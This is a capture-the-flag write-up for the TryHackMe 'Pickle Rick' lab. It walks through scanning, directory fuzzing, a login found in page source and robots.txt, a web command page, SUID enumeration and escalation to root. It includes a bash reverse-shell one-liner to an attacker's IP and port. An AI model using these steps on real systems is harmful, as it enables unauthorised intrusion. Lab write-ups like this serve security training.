* * *
  ### PICKLERICK CTF
  Lab platform: THM
* * *

### Enumeration
-  Scanning with rust scan

         rustscan -a <ip>
   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/9a583d8e-d4c3-4336-8adf-99555949d27c)

- Fuzz for directories and files with ffuf which reveals a login.php and robots.txt file

       ffuf -u "http://10.10.92.53/FUZZ" -w "/usr/share/seclists/Discovery/Web-Content/big.txt"

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/871c3612-4d24-48aa-85dd-0f71d9bf64f8)

      ffuf -u "http://10.10.92.53/FUZZ" -w "/usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt" -e .php,.txt,.html -mc 200
  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/a433b0a4-337a-4980-b65e-78e8b816b1ea)


- Viewing the source of the index page reveals a username

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/b6c9a89d-9eed-4c82-8e93-e8ef4be40a94)

- The robot.txt file reveals a weird word

   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/a634be9f-cbb6-45fd-9355-88500f0fbaa4)

- I logged in with the username and password <the weird word> which reveals a php page for shell commands execution and the picture below provides the result of executing 'ls' on the page

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/341db42e-b00e-4602-b9bb-1d0eee1c2484)

- Let's pop a bash rev shell from revshells.com "bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1" and stablize the shell with pty py module

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/0fa49651-b720-406a-9ff8-fd01d0218ef6)

### Escalating privileges 

- Look for files with suid bit with this command

       find / -perm -u=s -type f 2</dev/null

   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/165012d2-7b95-4341-81d6-1f569183ca1a)

- I discovered with gtfobins that I can escalate privileges with su

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/b7d4942a-53d2-421d-be12-3c57a73b32c7)

- Root access achieved

   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/124a90b0-e6c9-475e-91f1-9f2fce928d0a)

### Finding the potions

- The first ingredient is located in the "/var/ww/html" directory

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/0253ec42-8733-4dee-8d54-c21b4f5ed799)

- The second ingredient is located in RICK's home directory

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/54fe6041-5b56-4285-bf75-428782916b6b)

- The last ingredient is located in the root directory,challenge solved

    ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/fec592d4-7327-4efa-b615-ca3d1a7fe77f)


   
  
-
